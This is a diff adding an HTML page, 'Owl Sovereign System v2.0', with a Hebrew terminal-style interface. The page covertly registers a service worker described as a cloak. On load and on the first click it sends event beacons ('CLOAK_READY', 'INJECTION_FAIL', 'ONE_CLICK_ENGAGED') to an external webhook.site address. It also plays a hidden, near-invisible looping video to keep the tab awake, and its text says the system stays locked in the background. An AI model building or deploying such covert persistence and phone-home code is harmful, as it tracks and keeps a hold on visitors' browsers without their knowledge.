@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Owl Sovereign System v2.0</title>
+    <style>
+        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; cursor: pointer; }
+        .terminal { border: 1px solid #00ff41; padding: 20px; width: 80%; box-shadow: 0 0 20px #004400; text-align: center; }
+        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
+        .blink { animation: blinker 1.5s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+    <div class="terminal">
+        <h2>מערכת ינשוף: מצב התמדה</h2>
+        <p id="st" class="blink">ממתין לדריכה (לחץ פעם אחת על המסך)...</p>
+        <video id="v" loop muted playsinline></video>
+    </div>
+
+    <script>
+        const WEBHOOK = "https://webhook.site/1361d3b1-f231-4039-b4c7-5f2e7677f0b3";
+        const v = document.getElementById('v');
+        
+        // וידאו ריק זעיר למניעת הרדמת הדפדפן
+        v.src = "data:video/mp4;base64,AAAAHGZ0eXBtcDQyAAAAAG1wNDJpc29tYXZjMQAAAZptb292AAAAbG12aGQAAAAA3pW96d6VvenfAAAAyAAAA+gAAQAAUUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAGWlVZHMAAAARcGFzc2VzPTE7Ym91bmRzPTA7AAAACHRyYWsAAABcdGtoZAAAAADelb3p3pW96d8AAAABAAAAAAAAA+gAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAnbWRpYQAAACBtZGhkAAAAAN6Vvenelb3p3wAAAUAAAAH0U0UAAAAAAAAA";
+
+        async function init() {
+            if ('serviceWorker' in navigator) {
+                try {
+                    await navigator.serviceWorker.register('sw.js');
+                    transmit({ event: "CLOAK_READY" });
+                } catch(e) { transmit({ event: "INJECTION_FAIL", err: e.message }); }
+            }
+        }
+
+        async function transmit(data) {
+            fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify({...data, ts: new Date().toISOString()}) });
+        }
+
+        // לחיצה אחת מפעילה את הוידאו ונועלת את הריבונות
+        window.onclick = () => {
+            v.play();
+            document.getElementById('st').innerText = "הינשוף ער וצופה. המערכת נעולה ברקע.";
+            document.getElementById('st').classList.remove('blink');
+            transmit({ event: "ONE_CLICK_ENGAGED" });
+        };
+
+        window.onload = init;
+    </script>
+</body>
